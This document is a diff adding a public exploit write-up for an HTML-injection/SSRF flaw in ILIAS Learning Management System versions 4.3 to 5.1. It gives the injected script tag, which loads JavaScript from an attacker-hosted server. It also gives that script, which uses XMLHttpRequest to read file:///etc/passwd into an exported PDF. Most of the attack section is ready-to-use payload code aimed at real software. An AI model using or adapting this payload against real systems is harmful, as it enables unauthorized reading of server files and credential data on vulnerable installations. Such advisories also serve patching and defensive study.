@@ -1,0 +1,33 @@
+# Exploit Title: ILIAS Learning Management System 4.3 - SSRF 
+# Date: 10-08-2020
+# Exploit Author: Dot/kx1z0
+# Vendor Homepage: https://www.ilias.de/
+# Software Link: https://github.com/ILIAS-eLearning/ILIAS/tree/release_4-3
+# Version: 4.3-5.1
+# Tested on: Linux
+# Description
+We can create portfolios, export them to PDF and download them.
+The issue is that there is an HTML Injection, and if we inject HTML
+into the portfolio, when it is exported to PDF, it will be rendered.
+So we can take advantage that it is running under the wrapper file://
+to inject an XMLHttpRequest requesting the local file we want, that
+when downloading the PDF, we can see the content of that file
+
+# Exploit
+We cannot inject the XMLHttpRequest directly into the content of the
+portfolio, as there is something blocking it. So we will have to host
+a script in our own server and invoke it from the portfolio
+
+We insert this in the portfolio:
+<script src=host.com/test.js> </script>
+
+Script in our server:
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+
+So, finally, we will only have to download the PDF and there, will be
+the content of the file we have requested.
